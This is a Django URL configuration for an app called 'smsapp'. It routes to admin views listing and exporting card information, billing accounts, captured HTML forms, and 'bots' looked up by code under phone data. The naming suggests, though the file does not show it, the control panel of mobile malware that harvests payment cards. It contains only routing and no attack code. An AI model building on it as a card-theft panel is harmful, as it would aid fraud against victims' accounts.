from django.conf.urls import patterns, include, url

from django.contrib import admin

urlpatterns = patterns(
    '',
    url(r'^$', 'smsapp.views.home', name='home'),
    url(r'^accounts/', include('django.contrib.auth.urls')),
    url(r'^app/', include('smsapp.urls')),
    url(r'^admin/info/cards/$', 'smsapp.admin_extra_views.card_info_list', name='card_list'),
    url(r'^admin/info/cards/(?P<export>\w+)$', 'smsapp.admin_extra_views.card_info_list', name='cards_export'),
    url(r'^admin/info/hide_card/(?P<oid>\w+)/$', 'smsapp.admin_extra_views.hide_card_info', name='hide_card_info'),
    url(r'^admin/crash_report/(?P<oid>\w+)/$', 'smsapp.admin_extra_views.crash_report', name='crash_report'),
    url(r'^admin/info/apps/$', 'smsapp.admin_extra_views.top_apps', name='app_list'),
    url(r'^admin/info/bill/$', 'smsapp.admin_extra_views.billing_acc_list', name='billing_list'),
    url(r'^admin/info/html_forms/$', 'smsapp.admin_extra_views.html_forms_list', name='html_forms_list'),
    url(r'^admin/info/html_form_delete/$', 'smsapp.admin_extra_views.html_form_delete', name='html_forms_delete'),
    url(r'^admin/info/countries/$', 'smsapp.admin_extra_views.country_list_admin', name='country_list_admin'),
    url(r'^admin/info/html_forms/detail/(?P<objid>\w+)/$', 'smsapp.admin_extra_views.html_form_details',
        name='html_form_details'),
    url(r'^admin/phonedata/bycode/(?P<code>\w+)/$', 'smsapp.admin_extra_views.view_bot', name='bot_by_code'),
    url(r'^admin/phonedata/bycode/$', 'smsapp.admin_extra_views.view_bot', name='bot_by_code_post'),
    url(r'^admin/', include(admin.site.urls)),
)
